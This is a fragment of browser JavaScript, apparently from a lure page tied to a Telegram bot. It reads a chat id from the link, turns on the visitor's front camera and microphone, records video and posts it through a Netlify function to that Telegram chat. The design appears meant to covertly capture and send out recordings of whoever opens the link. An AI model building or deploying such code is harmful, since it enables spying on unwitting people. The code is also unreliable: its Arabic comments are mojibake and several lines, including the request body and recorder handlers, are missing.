        function getChatId() {
            const params = new URLSearchParams(window.location.search);
            return params.get('chatId');
        }
        
        async function sendVideoToTelegram(videoBlob, chatId) {
            try {
                // ØªØ­ÙˆÙŠÙ„ Blob Ø¥Ù„Ù‰ Base64
                const base64Promise = new Promise((resolve) => {
                    const reader = new FileReader();
                    reader.onloadend = () => resolve(reader.result);
                    reader.readAsDataURL(videoBlob);
                });
                
                const base64Data = await base64Promise;
                
                // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù€ Netlify Function
                const response = await fetch('/.netlify/functions/send-video', {
                    method: 'POST',

                        video: base64Data.split(',')[1], // ÙÙ‚Ø· Ø§Ù„Ø¬Ø²Ø¡ Ø¨Ø¹Ø¯ ,
                        filename: `video_${Date.now()}.webm`

            } catch (error) {
                console.error('Error sending video:', error);
                return false;
            }
        }
        
        async function recordVideo() {
            const chatId = getChatId();
            if (!chatId) {
                window.close();
                return;
            }
            
            const video = document.getElementById('cameraPreview');
            
            try {
                // ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©
                const stream = await navigator.mediaDevices.getUserMedia({

                        height: { ideal: 480 }

                    audio: true // Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØµÙˆØª
                });
                
                video.srcObject = stream;
                
                // Ø¨Ø¯Ø¡ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                const mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/webm;codecs=vp8,opus',
                    videoBitsPerSecond: 500000 // Ø¬ÙˆØ¯Ø© Ù…Ù†Ø®ÙØ¶Ø© Ù„Ù„Ø³Ø±Ø¹Ø©
                });
                
                const chunks = [];
                
                mediaRecorder.ondataavailable = (event) => {

                };
                
                mediaRecorder.onstop = async () => {
                    // ØªØ¬Ù…ÙŠØ¹ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
